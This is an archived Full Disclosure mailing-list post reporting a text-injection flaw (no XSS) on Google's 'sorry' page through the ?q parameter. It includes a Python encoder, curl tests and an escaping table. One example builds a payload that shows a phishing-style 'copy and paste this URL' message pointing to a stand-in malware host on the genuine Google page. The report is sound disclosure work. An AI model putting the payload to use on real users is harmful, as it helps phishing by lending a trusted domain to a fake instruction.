---
title: Text injection on https://www.google.com/sorry/index via ?q parameter (no XSS)
url: https://seclists.org/fulldisclosure/2025/Jan/21
source: Full Disclosure
date: 2025-01-31
fetch_date: 2025-10-06T20:15:09.393225
---

# Text injection on https://www.google.com/sorry/index via ?q parameter (no XSS)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

![](/shared/images/nst-icons.svg#search)

# Text injection on https://www.google.com/sorry/index via ?q parameter (no XSS)

---

*From*: David Fifield <david () bamsoftware com>
*Date*: Tue, 28 Jan 2025 02:26:16 -0700

---

```
The page https://www.google.com/sorry/index is familiar to Tor and VPN
users. It is the one that says "Our systems have detected unusual
traffic from your computer network. Please try your request again
later." You will frequently be redirected to this page when using Tor
Browser, when you do a search on a Google site such as www.youtube.com
or scholar.google.com. The text of the page reports the client IP
address, a timestamp of the request, and the URL that was requested.

At 2025-01-28 03:00 or earlier, the "sorry" page changed its behavior
from what I have seen before. After the client IP address, the page now
displays " ≠ ", followed by a few apparently nonsense bytes (not even
necessarily properly UTF-8–encoded). The extra bytes turn out to come
from a data structure that is encoded in the ?q URL query parameter. By
changing the ?q parameter, you can make the string of bytes have any
length and contents you like. The byte string will be included in the
HTML body, after the client IP address and " ≠ ". However, any bytes
that have meaning in HTML will be HTML-escaped, so while you can make
text appear on the page, no XSS is possible, as far as I can tell.

This is a simple demonstration:

        https://www.google.com/sorry/index?q=EgtoZWxsbyB3b3JsZA
        (archived) https://archive.is/DD9xB

This displays:

        IP address: <client IP address> ≠ hello world

Let's decode the ?q payload to see what's going on.

        $ python3 -c 'import base64; print(repr(base64.urlsafe_b64decode("EgtoZWxsbyB3b3JsZA==")))'
        b'\x12\x0bhello world'

After base64 decoding, the first byte is 0x12, which is some kind of
data type indicator. The second byte, 0x0b, is the length of the value
to follow. Then the value is what ends up being copied into the page.

The length field is actually a Protobuf varint. Lengths greater than 127
need to be encoded as more than 1 byte:
https://protobuf.dev/programming-guides/encoding/#varints
The following is a Python program to encode arbitrary byte strings
appropriately for the ?q parameter:

#!/usr/bin/env python3
import base64
import sys
if len(sys.argv) > 1:
    payload, = sys.argv[1:]
    payload = payload.encode()
else:
    payload = sys.stdin.buffer.read()
def encode_varint(n):
    e = [n & 0x7f]
    n >>= 7
    while n > 0:
        e[len(e) - 1] |= 0x80
        e.append(n & 0x7f)
        n >>= 7
    return bytes(e)
print(base64.urlsafe_b64encode(b"\x12" + encode_varint(len(payload)) + payload).rstrip(b"=").decode())

Use it as follows, for example:

        $ curl "https://www.google.com/sorry/index?q=$(printf 'hello world' | ./sorry-payload)"

You can see what HTML escaping the server applies by sending a string
that consists of every byte value:

        $ curl "https://www.google.com/sorry/index?q=$(for c in $(seq 0 255); do printf '\x'$(printf %02x $c); done |
./sorry-payload)" -o resp

00000000: 0001 0203 0405 0607 0820 2020 2020 0e0f  .........     ..
00000010: 1011 1213 1415 1617 1819 1a1b 1c1d 1e1f  ................
00000020: 2021 2671 756f 743b 2324 2526 616d 703b   !&quot;#$%&amp;
00000030: 2623 3339 3b28 292a 2b2c 2d2e 2f30 3132  &#39;()*+,-./012
00000040: 3334 3536 3738 393a 3b26 6c74 3b3d 2667  3456789:;&lt;=&g
00000050: 743b 3f40 4142 4344 4546 4748 494a 4b4c  t;?@ABCDEFGHIJKL
00000060: 4d4e 4f50 5152 5354 5556 5758 595a 5b5c  MNOPQRSTUVWXYZ[\
00000070: 5d5e 5f60 6162 6364 6566 6768 696a 6b6c  ]^_`abcdefghijkl
00000080: 6d6e 6f70 7172 7374 7576 7778 797a 7b7c  mnopqrstuvwxyz{|
00000090: 7d7e 7f80 8182 8384 8586 8788 898a 8b8c  }~..............
000000a0: 8d8e 8f90 9192 9394 9596 9798 999a 9b9c  ................
000000b0: 9d9e 9fa0 a1a2 a3a4 a5a6 a7a8 a9aa abac  ................
000000c0: adae afb0 b1b2 b3b4 b5b6 b7b8 b9ba bbbc  ................
000000d0: bdbe bfc0 c1c2 c3c4 c5c6 c7c8 c9ca cbcc  ................
000000e0: cdce cfd0 d1d2 d3d4 d5d6 d7d8 d9da dbdc  ................
000000f0: ddde dfe0 e1e2 e3e4 e5e6 e7e8 e9ea ebec  ................
00000100: edee eff0 f1f2 f3f4 f5f6 f7f8 f9fa fbfc  ................
00000110: fdfe ff                                  ...

The following replacements are applied:

        0x09    HT      becomes 0x20
        0x0a    LF      becomes 0x20
        0x0b    VT      becomes 0x20
        0x0c    FF      becomes 0x20
        0x0d    CR      becomes 0x20
        0x22    "       becomes &quot;
        0x26    &       becomes &amp;
        0x27    '       becomes &#39;
        0x3c    <       becomes &lt;
        0x3e    >       becomes &gt;

Besides 0x12, there are other type codes normally present in the ?q
parameter. Collect a few ?q parameter values organically, base64 decode
them, and you will see similar structures and repeated byte strings. If
?q contains more than one 0x12 specification, it looks like the last one
wins. In the ?q values I saw, the 0x12 value was 4 bytes long, and
contained the IPv4 address of a Tor exit node. The " ≠ " after the
textual client IP address makes it look like it's some debugging code
related to IP address comparison.

You can get the "sorry" page in languages other than English using
either the ?hl URL query parameter or the Accept-Language HTTP header.
The languages I tried used the same escaping as the default English one.
The ?ie and ?oe (input encoding and output encoding;
https://developers.google.com/custom-search/docs/xml_results#wsCharacterEncoding)
parameters do not appear to have any effect.

        $ curl "https://www.google.com/sorry/index?q=$(printf 'hello world' | ./sorry-payload)" -H 'Accept-Language:
zh-CN'
        https://www.google.com/sorry/index?q=EgtoZWxsbyB3b3JsZA&hl=zh-CN
        (archive) https://archive.is/P6dbS

Though it's not possible to inject active content such as HTML or
JavaScript, one could cause a phishing-style plaintext URL to appear on
the page:

        $ curl "https://www.google.com/sorry/index?q=$(printf 'Copy and paste this URL to fix the problem:
\u27a1\ufe0fhttp://malware.example/\u2b05\ufe0f'; | ./sorry-payload)"

https://www.google.com/sorry/index?q=Ek9Db3B5IGFuZCBwYXN0ZSB0aGlzIFVSTCB0byBmaXggdGhlIHByb2JsZW06IOKeoe-4j2h0dHA6Ly9tYWx3YXJlLmV4YW1wbGUv4qyF77iP
        (archive) https://archive.is/D8cf4

Similar tricks are possible with the ?continue URL query parameter,
which is omitted in the above examples, but which normally appears in
redirections to https://www.google.com/sorry/index. The contents of
?continue get inserted after the "URL: " label on the page.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](20)
[By Date](date.html#21)
[![Next](/images/right-icon-16x16.png)](22)

[![Previous](/images/left-icon-16x16.png)](20)
[By Thread](index.html#21)
[![Next](/images/right-icon-16x16.png)](22)

### Current thread:

* **Text injection on https://www.google.com/sorry/index via ?q parameter (no XSS)** *David Fifield (Jan 29)*

![](/shared/imag...